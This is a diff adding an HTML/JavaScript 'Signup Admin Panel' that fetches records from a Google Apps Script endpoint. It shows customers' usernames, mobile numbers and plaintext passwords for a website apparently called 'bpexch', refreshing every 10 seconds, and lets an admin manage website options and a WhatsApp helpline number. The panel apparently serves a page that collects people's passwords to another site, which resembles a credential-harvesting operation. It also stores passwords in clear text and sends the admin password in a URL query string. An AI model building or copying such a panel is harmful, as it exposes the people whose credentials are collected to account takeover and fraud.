@@ -1,0 +1,513 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - Signups</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&display=swap");
+
+    :root {
+      --bg-a: #173457;
+      --bg-b: #1f4f7a;
+      --card: #f8fbff;
+      --border: #cdd9ea;
+      --text: #1f2e43;
+      --muted: #586a86;
+      --accent: #2d7fc6;
+      --accent-dark: #1f67a5;
+      --ok: #187547;
+      --error: #b41f3b;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      font-family: "Manrope", sans-serif;
+      background: linear-gradient(180deg, var(--bg-a), var(--bg-b));
+      color: var(--text);
+      padding: 20px;
+    }
+
+    .panel {
+      width: min(1200px, 100%);
+      margin: 0 auto;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 18px 42px rgba(6, 17, 34, 0.35);
+    }
+
+    .panel-head {
+      background: linear-gradient(90deg, #0f2d4f, #1f5f94);
+      color: #eaf3ff;
+      padding: 16px 20px;
+      display: grid;
+      gap: 10px;
+    }
+
+    .panel-head h1 { font-size: clamp(1.4rem, 2.8vw, 2rem); font-weight: 800; }
+
+    .controls {
+      display: grid;
+      grid-template-columns: minmax(0, 220px) minmax(0, 220px) auto auto;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .controls input {
+      border: 1px solid #7ba2cc;
+      background: #f6fbff;
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-size: 0.95rem;
+      outline: none;
+      color: #24415f;
+      width: 100%;
+    }
+
+    .btn {
+      border: none;
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-size: 0.93rem;
+      font-weight: 800;
+      cursor: pointer;
+      color: #fff;
+      background: var(--accent);
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+
+    .btn:hover { background: var(--accent-dark); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .btn.secondary { background: #5f6f85; }
+    .btn.secondary:hover { background: #4f5d70; }
+
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px;
+      font-size: 0.88rem;
+      color: var(--muted);
+      padding: 12px 20px;
+      border-bottom: 1px solid var(--border);
+      background: #f4f8ff;
+    }
+
+    .meta strong { color: #26476a; }
+
+    .config-wrap {
+      border-bottom: 1px solid var(--border);
+      padding: 14px 20px 18px;
+      background: #f8fbff;
+      display: grid;
+      gap: 12px;
+    }
+
+    .config-wrap h2 { font-size: 1.08rem; color: #24456a; }
+
+    .config-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+    .config-box {
+      border: 1px solid #d8e3f2;
+      border-radius: 10px;
+      background: #fff;
+      padding: 12px;
+      display: grid;
+      gap: 10px;
+    }
+
+    .config-box label { font-size: 0.84rem; font-weight: 700; color: #406081; letter-spacing: 0.2px; }
+
+    .config-box input {
+      border: 1px solid #c7d6ea;
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-size: 0.92rem;
+      color: #2a4666;
+      outline: none;
+      width: 100%;
+    }
+
+    .site-add-row { display: grid; grid-template-columns: 1fr auto; gap: 8px; align-items: center; }
+    .site-tags { display: flex; flex-wrap: wrap; gap: 8px; min-height: 30px; }
+
+    .site-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      border: 1px solid #c5d8f0;
+      background: #eef5ff;
+      color: #244a72;
+      border-radius: 999px;
+      padding: 6px 10px;
+      font-size: 0.84rem;
+      font-weight: 700;
+    }
+
+    .remove-site-btn {
+      border: none; background: transparent; color: #315b86;
+      cursor: pointer; font-size: 0.86rem; font-weight: 800; line-height: 1; padding: 0;
+    }
+
+    .remove-site-btn:hover { color: #b41f3b; }
+
+    .table-wrap { overflow-x: auto; }
+
+    table { width: 100%; border-collapse: collapse; min-width: 760px; }
+
+    th, td {
+      border-bottom: 1px solid #e2e9f4;
+      padding: 11px 12px;
+      text-align: left;
+      font-size: 0.9rem;
+      white-space: nowrap;
+    }
+
+    th { background: #ebf3ff; color: #27486d; font-weight: 800; position: sticky; top: 0; z-index: 1; }
+    tbody tr:hover { background: #f7fbff; }
+
+    .status {
+      padding: 11px 20px;
+      font-size: 0.9rem;
+      border-top: 1px solid var(--border);
+      min-height: 44px;
+      color: var(--muted);
+      background: #fdfefe;
+    }
+
+    .status.ok    { color: var(--ok);    font-weight: 700; }
+    .status.error { color: var(--error); font-weight: 700; }
+
+    @media (max-width: 760px) {
+      body { padding: 12px; }
+      .controls { grid-template-columns: 1fr; }
+      .config-grid { grid-template-columns: 1fr; }
+      .site-add-row { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <main class="panel">
+    <header class="panel-head">
+      <h1>Signup Admin Panel</h1>
+      <div class="controls">
+        <input id="adminUser" type="text" placeholder="Admin Username">
+        <input id="adminPass" type="password" placeholder="Admin Password">
+        <button class="btn" id="loginBtn" type="button">Login</button>
+        <button class="btn" id="refreshBtn" type="button">Refresh</button>
+      </div>
+    </header>
+
+    <section class="meta">
+      <span>Total Records: <strong id="totalCount">0</strong></span>
+      <span>Last Refresh: <strong id="lastRefresh">--</strong></span>
+      <span>Auto Refresh: <strong>10 sec</strong></span>
+    </section>
+
+    <section class="config-wrap">
+      <h2>Signup Page Settings</h2>
+      <div class="config-grid">
+        <div class="config-box">
+          <label for="newWebsiteInput">Website Options</label>
+          <div class="site-add-row">
+            <input id="newWebsiteInput" type="text" placeholder="Jaise: bpexch">
+            <button class="btn secondary" id="addWebsiteBtn" type="button">Add Website</button>
+          </div>
+          <div class="site-tags" id="websiteTags">
+            <span class="site-tag">bpexch</span>
+          </div>
+        </div>
+        <div class="config-box">
+          <label for="whatsappHelplineInput">WhatsApp Helpline Number</label>
+          <input id="whatsappHelplineInput" type="text" inputmode="numeric" placeholder="Jaise: 919876543210">
+          <button class="btn" id="saveConfigBtn" type="button">Save Settings</button>
+        </div>
+      </div>
+    </section>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Submitted At</th>
+            <th>Username</th>
+            <th>Mobile Number</th>
+            <th>Password</th>
+            <th>Website</th>
+          </tr>
+        </thead>
+        <tbody id="tableBody">
+          <tr><td colspan="5">No data loaded yet.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p class="status" id="statusText">Admin login karein, phir customer ka data yahan live dikhega.</p>
+  </main>
+
+  <script>
+    // ─── Hardcoded script URL — no user input needed ──────────────────────────
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyLGECymHvBbbWumfwrcHJRmESrF-9PIJbJZf8DNO-cFoSIR3ku5ibTVSvLBQH6hy0fWw/exec";
+    const AUTO_REFRESH_MS   = 10000;
+    const STORAGE_TOKEN     = "signup_admin_panel_token";
+    const STORAGE_USER      = "signup_admin_panel_user";
+    const DEFAULT_WEBSITES  = ["bpexch"];
+    const DEFAULT_HELPLINE  = "919999999999";
+
+    // ─── DOM ──────────────────────────────────────────────────────────────────
+    const adminUserInput        = document.getElementById("adminUser");
+    const adminPassInput        = document.getElementById("adminPass");
+    const loginBtn              = document.getElementById("loginBtn");
+    const refreshBtn            = document.getElementById("refreshBtn");
+    const tableBody             = document.getElementById("tableBody");
+    const statusText            = document.getElementById("statusText");
+    const totalCount            = document.getElementById("totalCount");
+    const lastRefresh           = document.getElementById("lastRefresh");
+    const newWebsiteInput       = document.getElementById("newWebsiteInput");
+    const addWebsiteBtn         = document.getElementById("addWebsiteBtn");
+    const websiteTags           = document.getElementById("websiteTags");
+    const whatsappHelplineInput = document.getElementById("whatsappHelplineInput");
+    const saveConfigBtn         = document.getElementById("saveConfigBtn");
+
+    let sessionToken   = localStorage.getItem(STORAGE_TOKEN) || "";
+    let websiteOptions = DEFAULT_WEBSITES.slice();
+    adminUserInput.value = localStorage.getItem(STORAGE_USER) || "";
+
+    // ─── JSONP — bypasses CORS completely ─────────────────────────────────────
+    function gasGet(params) {
+      return new Promise(function (resolve, reject) {
+        var cb    = "_gc" + Date.now().toString(36) + Math.random().toString(36).slice(2);
+        var timer = setTimeout(function () { cleanup(); reject(new Error("Request timed out. Check internet.")); }, 15000);
+        var el;
+
+        function cleanup() {
+          clearTimeout(timer);
+          delete window[cb];
+          if (el && el.parentNode) el.parentNode.removeChild(el);
+        }
+
+        window[cb] = function (data) { cleanup(); resolve(data); };
+
+        var qs = Object.keys(params)
+          .map(function (k) { return encodeURIComponent(k) + "=" + encodeURIComponent(params[k]); })
+          .join("&");
+
+        el = document.createElement("script");
+        el.src = GOOGLE_SCRIPT_URL + "?" + qs + "&callback=" + cb + "&_t=" + Date.now();
+        el.onerror = function () { cleanup(); reject(new Error("Network error — check internet connection.")); };
+        document.head.appendChild(el);
+      });
+    }
+
+    // ─── Helpers ──────────────────────────────────────────────────────────────
+    function setStatus(msg, type) {
+      statusText.textContent = msg;
+      statusText.className   = "status" + (type ? " " + type : "");
+    }
+
+    function escapeHtml(v) {
+      return String(v || "")
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/'/g, "&#39;");
+    }
+
+    function normalizePhone(value) {
+      var d = String(value || "").replace(/\D/g, "");
+      if (!d) return "";
+      if (d.length === 10) return "91" + d;
+      if (d.length >= 11 && d.length <= 15) return d;
+      return "";
+    }
+
+    function dedupeWebsites(list) {
+      var seen = {}, clean = [];
+      list.forEach(function (item) {
+        var v = String(item || "").trim();
+        if (!v) return;
+        var k = v.toLowerCase();
+        if (seen[k]) return;
+        seen[k] = true; clean.push(v);
+      });
+      return clean;
+    }
+
+    // ─── Render ───────────────────────────────────────────────────────────────
+    function renderWebsiteTags() {
+      if (!websiteOptions.length) {
+        websiteTags.innerHTML = "<span class='site-tag'>No website</span>";
+        return;
+      }
+      websiteTags.innerHTML = websiteOptions.map(function (s) {
+        return "<span class='site-tag'><span>" + escapeHtml(s) + "</span>" +
+          "<button class='remove-site-btn' type='button' data-site='" + escapeHtml(s) +
+          "' aria-label='Remove " + escapeHtml(s) + "'>x</button></span>";
+      }).join("");
+    }
+
+    function renderRows(rows) {
+      if (!rows.length) {
+        tableBody.innerHTML = "<tr><td colspan='5'>No records found.</td></tr>";
+        return;
+      }
+      tableBody.innerHTML = rows.map(function (row) {
+        return "<tr>" +
+          "<td>" + escapeHtml(row["Submitted At"] || "") + "</td>" +
+          "<td>" + escapeHtml(row["Username"] || "") + "</td>" +
+          "<td>" + escapeHtml(row["Mobile Number"] || "") + "</td>" +
+          "<td>" + escapeHtml(row["Password"] || "") + "</td>" +
+          "<td>" + escapeHtml(row["Website"] || "") + "</td>" +
+          "</tr>";
+      }).join("");
+    }
+
+    // ─── Admin actions ────────────────────────────────────────────────────────
+    async function loginAdmin() {
+      var username = adminUserInput.value.trim();
+      var password = adminPassInput.value;
+      if (!username || !password) { setStatus("Username aur password required hai.", "error"); return; }
+
+      setStatus("Logging in...", "");
+      loginBtn.disabled = true;
+
+      try {
+        var data = await gasGet({ action: "login", username: username, password: password });
+
+        if (!data.ok || !data.token) {
+          setStatus(data.error || "Invalid credentials.", "error");
+          loginBtn.disabled = false;
+          return;
+        }
+
+        sessionToken = data.token;
+        localStorage.setItem(STORAGE_TOKEN, sessionToken);
+        localStorage.setItem(STORAGE_USER, username);
+        adminPassInput.value = "";
+        setStatus("Login successful! Data load ho raha hai...", "ok");
+        await loadData();
+        await loadConfig(false);
+      } catch (err) {
+        setStatus("Login failed: " + err.message, "error");
+      }
+
+      loginBtn.disabled = false;
+    }
+
+    async function loadData() {
+      if (!sessionToken) { setStatus("Pehle admin login karein.", "error"); return; }
+      setStatus("Loading data...", "");
+
+      try {
+        var data = await gasGet({ action: "list", token: sessionToken });
+
+        if (!data.ok) {
+          if (String(data.error || "").toLowerCase().includes("unauthorized")) {
+            sessionToken = "";
+            localStorage.removeItem(STORAGE_TOKEN);
+            setStatus("Session expired. Dobara login karein.", "error");
+            return;
+          }
+          setStatus(data.error || "Data load nahi hua.", "error");
+          return;
+        }
+
+        renderRows(data.rows || []);
+        totalCount.textContent  = String(data.total || 0);
+        lastRefresh.textContent = new Date().toLocaleString();
+        setStatus("Data updated — " + (data.total || 0) + " records.", "ok");
+      } catch (err) {
+        setStatus("Fetch failed: " + err.message, "error");
+      }
+    }
+
+    async function loadConfig(showStatus) {
+      renderWebsiteTags();
+      try {
+        var data = await gasGet({ action: "config" });
+        if (!data || !data.ok) return;
+
+        var sv = dedupeWebsites(Array.isArray(data.websites) ? data.websites : []);
+        websiteOptions = sv.length ? sv : DEFAULT_WEBSITES.slice();
+        renderWebsiteTags();
+
+        var ph = normalizePhone(data.whatsappHelpline || "");
+        whatsappHelplineInput.value = ph || DEFAULT_HELPLINE;
+        if (showStatus) setStatus("Config loaded.", "ok");
+      } catch (err) {
+        if (showStatus) setStatus("Config load failed: " + err.message, "error");
+      }
+    }
+
+    async function saveConfig() {
+      if (!sessionToken) { setStatus("Settings save karne ke liye login karein.", "error"); return; }
+      websiteOptions = dedupeWebsites(websiteOptions);
+      if (!websiteOptions.length) { setStatus("Kam se kam ek website zaroori hai.", "error"); return; }
+
+      var phone = normalizePhone(whatsappHelplineInput.value);
+      if (!phone) { setStatus("Valid WhatsApp number dalo (e.g. 919876543210).", "error"); return; }
+
+      setStatus("Saving...", "");
+      try {
+        var data = await gasGet({
+          action: "save_config", token: sessionToken,
+          websites_json: JSON.stringify(websiteOptions), whatsapp_helpline: phone
+        });
+
+        if (!data.ok) {
+          if (String(data.error || "").toLowerCase().includes("unauthorized")) {
+            sessionToken = "";
+            localStorage.removeItem(STORAGE_TOKEN);
+            setStatus("Session expired. Dobara login karein.", "error");
+            return;
+          }
+          setStatus(data.error || "Config save nahi hua.", "error");
+          return;
+        }
+
+        websiteOptions = dedupeWebsites(Array.isArray(data.websites) ? data.websites : websiteOptions);
+        whatsappHelplineInput.value = normalizePhone(data.whatsappHelpline || phone);
+        renderWebsiteTags();
+        setStatus("Settings saved!", "ok");
+      } catch (err) {
+        setStatus("Save failed: " + err.message, "error");
+      }
+    }
+
+    async function addWebsiteFromInput() {
+      var name = String(newWebsiteInput.value || "").trim();
+      if (!name) { setStatus("Website name khali nahi ho sakta.", "error"); return; }
+      var next = dedupeWebsites(websiteOptions.concat([name]));
+      if (next.length === websiteOptions.length) { setStatus("Yeh website already list me hai.", "error"); return; }
+      websiteOptions = next;
+      newWebsiteInput.value = "";
+      renderWebsiteTags();
+      setStatus("Website added. Saving...", "");
+      await saveConfig();
+    }
+
+    // ─── Events ───────────────────────────────────────────────────────────────
+    loginBtn.addEventListener("click", loginAdmin);
+    refreshBtn.addEventListener("click", function () { loadData(); loadConfig(false); });
+    addWebsiteBtn.addEventListener("click", addWebsiteFromInput);
+    saveConfigBtn.addEventListener("click", saveConfig);
+    adminPassInput.addEventListener("keydown", function (e) { if (e.key === "Enter") loginAdmin(); });
+    newWebsiteInput.addEventListener("keydown", function (e) { if (e.key === "Enter") { e.preventDefault(); addWebsiteFromInput(); } });
+    websiteTags.addEventListener("click", async function (e) {
+      var t = e.target;
+      if (!t.classList.contains("remove-site-btn")) return;
+      websiteOptions = websiteOptions.filter(function (s) { return s !== String(t.getAttribute("data-site") || ""); });
+      renderWebsiteTags();
+      setStatus("Website removed. Saving...", "");
+      await saveConfig();
+    });
+
+    // ─── Auto refresh + init ──────────────────────────────────────────────────
+    setInterval(function () { if (sessionToken) loadData(); }, AUTO_REFRESH_MS);
+    loadConfig(false);
+    if (sessionToken) { setStatus("Saved session mili. Refreshing...", ""); loadData(); }
+  </script>
+</body>
+</html>
